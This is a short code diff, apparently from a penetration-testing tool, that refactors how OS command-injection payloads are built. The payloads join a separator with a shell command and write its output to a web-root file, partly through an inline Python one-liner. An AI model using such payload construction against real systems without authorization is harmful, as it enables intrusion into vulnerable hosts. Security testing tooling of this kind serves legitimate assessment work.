@@ -71,7 +71,6 @@ def decision_alter_shell(separator, TAG, OUTPUT_TEXTFILE):
 Execute shell commands on vulnerable host.
 """
 def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
-
   if settings.TFB_DECIMAL == True:
     payload = (separator + cmd)
 
@@ -87,7 +86,6 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
     payload = (separator +
               cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
-
   return payload
 
 """
@@ -106,9 +104,11 @@ def cmd_execution_alter_shell(separator, cmd, OUTPUT_TEXTFILE):
                 "') do @set /p = %i " + settings.CMD_NUL
                 )
   else:
+    settings.USER_APPLIED_CMD = cmd
+    cmd_exec = settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX
     payload = (separator +
               settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + 
-              settings.CMD_SUB_PREFIX + "echo " + settings.CMD_SUB_PREFIX + cmd + settings.CMD_SUB_SUFFIX + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
+              settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
               )
 
   # New line fixation
